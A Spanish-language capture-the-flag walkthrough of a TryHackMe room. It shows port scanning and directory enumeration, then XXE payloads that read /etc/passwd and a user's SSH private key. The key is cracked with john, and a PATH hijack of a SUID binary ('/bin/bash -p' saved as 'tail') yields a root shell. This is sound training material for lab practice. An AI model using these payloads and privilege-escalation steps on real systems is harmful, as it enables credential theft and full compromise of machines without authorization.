Bienvenidos a otra sala en tryhackme. En esta ocasion,  haremos uso de la vulnerabilidad XXE para leer rutas criticas de seguridad y estableceremos conexion ssh dentro del sistema. Luego, nos abusaremos de un binario para escalar privilegios a usuario raiz root.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`


```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.24s latency).
Scanned at 2023-07-12 23:11:39 EDT for 40s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap nos muestra 3 puertos abiertos. Comenzamos navegando al servidor web para investigar un poco. Iniciamos busqueda de directorio ocultos dentro del servidor web con la herramienta gobuster.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/12 23:14:17 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/custom (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
=====================================================
2023/07/12 23:15:15 Finished
=====================================================
```

Dentro del directorio /custom, encontramos un archivo **users.bak** que al descargarlo y leerlo, nos muestra unas credenciales del usuario admin con un hash, que al pasarlo por http://crackstation.net nos muestra la password correcta.

# Intrusion

Navegamos en el servidor web, en el puerto 8765 que nos averiguo nmap. Ahi podemos poner nuestras credenciales y acceder al servidor web. Al abrir el **page source**, podemos notar un mensaje hacia Barry.  Tambien, vemos el codigo, que contiene un script con una seccion que nos interesa "Insert XML Code", con esto, podemos utilizar la vulnerabilidad XXE para explotar este servidor web. 

Antes de continuar, tenemos que descargar el **dontforget.bak**, la ruta la encontramos en el page source, ahi se nos brindara el codigo xml que explotamos. El codigo sin modificar es el siguiente.:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

Para hacer uso de la vulnerabilidad XXE y leer usuarios dentro del sistema **/etc/passwd**, utilizamos el siguiente payload.

```bash
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Lo introducimos y hacemos unas modificaciones para que quede de la siguiente manera:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY this SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&this;</com>
</comment>
```

Anteriormente, pudimos ver un mensaje hacia Barry, lo usamos para leer su id_rsa y establecer una conexion ssh.

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY this SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&this;</com>
</comment>
```

Copiamos la id_rsa de barry en nuestra maquina atacante, le daremos permisos 600 y utilizamos ssh2john para averiguar la password antes de realizar una conexion ssh.

```bash
chmod 600 id_rsa # Damos permisos

# Crackeamos 
ssh2john id_rsa > hash.txt
john --wordlist=/Path/Wordlist hash.txt

# Establecemos conexion ssh
ssh -i id_rsa barry@IPTARGET
```


# Priv.Escalation

Listamos permisos elevados dentro del sistema.

```bash
find / -type f -perm -4000 -ls 2>/dev/null
 
/home/joe/live_log  120   44 -rwsr-xr-x   1 root   root   44168 May  7  2014 

```

Ejecutamos el binario, como dice el nombre del archivo, nos muestra un registro de acceso al servidor web. Para entrar mas en detalle, le lanzamos un strigs para ver como esta compuesto.

```bash
strings live_log

ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
'tail -f /var/log/nginx/access.log'
:*3$"
```

Vemos que se ejecuta tail dentro del binario. Lo que haremos, es dirigirnos al directorio /dev/shm, donde podremos crear archivos y modificarlos. Crearemos un archivo "tail" que ejecute una shell interactiva root. Le daremos todos los permisos y exportaremos la ruta para asi, cuando ejecutemos nuevamente el binario, nos de una shell privilegiada root.

```bash
cd /dev/shm

echo "/bin/bash -p" > tail
chmod 777 tail
export PATH=/dev/shm:$PATH

# Ejecutamos el binario
/home/joe/live_log
```

